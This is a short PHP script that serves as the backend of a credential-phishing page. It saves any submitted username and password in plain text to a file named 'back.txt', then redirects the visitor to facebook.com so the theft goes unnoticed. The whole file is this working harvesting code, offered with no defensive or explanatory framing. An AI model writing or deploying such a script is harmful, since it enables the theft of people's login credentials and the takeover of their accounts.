<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $data = "Username: $username | Password: $password\n";

    file_put_contents("back.txt", $data, FILE_APPEND);
    
    // Optional: Redirect after saving
    header("Location: https://www.facebook.com");
    exit();
}
?>
